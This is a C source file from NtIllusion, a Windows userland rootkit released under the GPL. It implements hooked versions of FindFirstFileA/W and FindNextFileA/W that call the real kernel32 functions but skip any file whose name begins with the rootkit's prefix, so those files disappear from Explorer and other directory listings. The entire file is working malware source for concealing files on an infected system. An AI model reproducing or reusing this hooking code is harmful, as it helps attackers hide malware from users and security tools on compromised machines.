/******************************************************************************
  kNTIFiles.c	: hides protected files from file listing
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/
#include <windows.h>
#include "kNTIFiles.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

// File enumeration routines
FARPROC fFindFirstFileA;	// Ainsi
FARPROC fFindNextFileA;		// Ainsi
FARPROC fFindFirstFileW;	// Unicode
FARPROC fFindNextFileW;		// Unicode
extern FARPROC fGetProcAddress;

/* *************** AINSI PART ********************************** */
// o EXPLORER : file camouflage - part I o
//		MyFindFirstFileA : hides protected files from file listing
HANDLE WINAPI MyFindFirstFileA(LPCTSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData)
{
	HANDLE hret= (HANDLE)1000;
	int go_on=1;

	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fFindFirstFileA) {
		fFindFirstFileA = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindFirstFileA");
		if(!fFindFirstFileA) return 0;
	}
	if(!fFindNextFileA) {
		fFindNextFileA = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindNextFileA");
		if(!fFindNextFileA) return 0;
	}
	
	if(VERBOSE_DIR_LIST) 
		OutputString("# FindFirstFileA '%s'\n",lpFileName);
	hret = (HANDLE) fFindFirstFileA(lpFileName, lpFindFileData);

	if(hret==INVALID_HANDLE_VALUE){
		if(VERBOSE_ERRORS)
			OutputString("[X] INVALID_HANDLE_VALUE\n");
		return hret;
	}
	if(!fFindNextFileA){
		if(VERBOSE_ERRORS) 	
			OutputString("[X] !fFindNextFileA\n");
		return 0; //if hijack failed
	}
	// While we get a 'hidden file', we loop
	while( !_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && go_on) {
		go_on = fFindNextFileA(hret, lpFindFileData);
		if(!_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && VERBOSE_STEALTH) {
				OutputString("[!] NTIllusion made the file '%s' invisible.\n",(lpFindFileData->cFileName));
		} else {
			if(VERBOSE_DIR_LIST) {
				OutputString("# FindNextFileA : '%s'\n", (lpFindFileData->cFileName));
			}
		}
	}
	// Oops, no more file ?
	if(!go_on) {
		//memset(lpFindFileData, 0, sizeof(LPWIN32_FIND_DATA));
		if(VERBOSE_ERRORS) OutputString("[X] INVALID_HANDLE_VALUE II\n");
		return INVALID_HANDLE_VALUE;
	}
	return hret;
}

// o EXPLORER : file camouflage - part II o
//		MyFindNextFileA : hides protected files from file listing
BOOL WINAPI MyFindNextFileA(
  HANDLE hFindFile,  // handle to search
  LPWIN32_FIND_DATA lpFindFileData 
                     // pointer to structure for data on found file
){
	BOOL ret;

	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fFindNextFileA) {
		fFindNextFileA = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindNextFileA");
		if(!fFindNextFileA) return 0;
	}

	// While we get a file that should not be shown, we get another :
	do {
		ret = fFindNextFileA(hFindFile, lpFindFileData);
		if(!_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && VERBOSE_STEALTH) {
				OutputString("[!] NTIllusion made the file : '%s' invisible.\n", (char*)(lpFindFileData->cFileName));
		} else {
			if(VERBOSE_DIR_LIST) {
				OutputString("# FindNextFileA : '%s'\n", (lpFindFileData->cFileName));
			}
		}
	} while( !_strnicmp(lpFindFileData->cFileName, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && ret!=0);
	// We're out of the loop so we may check if we broke because of no more file
	// If it's the case, we may clear the LPWIN32_FIND_DATA structure
	// as this : my_memset(lpFindFileData, 0, sizeof(LPWIN32_FIND_DATA));
	return ret;
}

/* *************** UNICODE PART ********************************** */
// o EXPLORER : file camouflage - part I o
//		MyFindFirstFileW : hides protected files from file listing
HANDLE WINAPI MyFindFirstFileW(
  LPCTSTR lpFileName,  // pointer to name of file to search for
  LPWIN32_FIND_DATA lpFindFileData 
                       // pointer to returned information
){
	HANDLE hret= (HANDLE)1000;
	int go_on=1;
	char sname[512], fname[512];

	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fFindFirstFileW) {
		fFindFirstFileW = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindFirstFileW");
		if(!fFindFirstFileW) return 0;
	}
	if(!fFindNextFileW) {
		fFindNextFileW = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindNextFileW");
		if(!fFindNextFileW) return 0;
	}

	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)lpFileName, -1, sname, 512,NULL, NULL); //Convert string from unicode
	if(VERBOSE_DIR_LIST)
		OutputString("# FindFirstFileW '%s'\n", (char*)sname);

	hret = (HANDLE) fFindFirstFileW(lpFileName, lpFindFileData);
	WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)(lpFindFileData->cFileName), -1, fname, 512,NULL, NULL); //Convert string from unicode
	
	if(hret==INVALID_HANDLE_VALUE){
		if(VERBOSE_ERRORS) 
			OutputString("[X] INVALID_HANDLE_VALUE\n");
		return hret;
	}
	if(!fFindNextFileW){
		if(VERBOSE_ERRORS) 
			OutputString("[X] !fFindNextFileW\n");
		return 0; //if hijack failed
	}
	// While we get a 'hidden file', we loop
	while( !_strnicmp((char*)fname, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && go_on) {
		go_on = fFindNextFileW(hret, lpFindFileData);
		WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)(lpFindFileData->cFileName), -1, fname, 512,NULL, NULL); //Convert string from unicode
		if(!_strnicmp((char*)fname, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && VERBOSE_STEALTH) {
				OutputString("[!] NTIllusion made the file : '%s' invisible.\n", (char*)fname);
		} else {
			if(VERBOSE_DIR_LIST)
				OutputString("# FindFirstFileW : '%s'\n", (char*)fname);
		}
	}
	// Oops, no more file ?
	if(!go_on) {
		//my_memset(lpFindFileData, 0, sizeof(LPWIN32_FIND_DATA));
		if(VERBOSE_ERRORS) OutputString("[X] No more files to find\n");
		return INVALID_HANDLE_VALUE;
	}
  return hret;
}

// o EXPLORER : file camouflage - part II o
//		MyFindNextFileW : hides protected files from file listing
BOOL WINAPI MyFindNextFileW(
  HANDLE hFindFile,  // handle to search
  LPWIN32_FIND_DATA lpFindFileData 
                     // pointer to structure for data on found file
){
	BOOL ret;
	char fname[512];
	
	// Get real address using GetProcAddress because the function may not have been hijacked at IAT
	// level but using GetProcAddress()
	if(!fFindNextFileW) {
		fFindNextFileW = (FARPROC) fGetProcAddress(GetModuleHandle("kernel32.dll"),"FindNextFileW");
		if(!fFindNextFileW) return 0;
	}

	// While we get a file that file should not be shown, we get another :
	do {
		ret = (BOOL) fFindNextFileW(hFindFile, lpFindFileData);
		WideCharToMultiByte(CP_ACP, 0,(const unsigned short *)(lpFindFileData->cFileName), -1, fname, 512,NULL, NULL); //Convert string from unicode
		//printf("FindNextFile: '%s'\n", lpFindFileData->cFileName);
		if(!_strnicmp((char*)fname, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && VERBOSE_STEALTH) {
			OutputString("[!] NTIllusion made the file : '%s' invisible.\n", (char*)fname);	
		} else {
			if(VERBOSE_DIR_LIST) {
				OutputString("# FindNextFileW : '%s'\n", (char*)fname);
			}
		}
	} while( !_strnicmp((char*)fname, RTK_FILE_CHAR, strlen(RTK_FILE_CHAR)) && ret!=0);
	// We're out of the loop so we may check if we broke because of no more file
	// If it's the case, we may clear the LPWIN32_FIND_DATA structure
	// as this : my_memset(lpFindFileData, 0, sizeof(LPWIN32_FIND_DATA));
	return ret;
}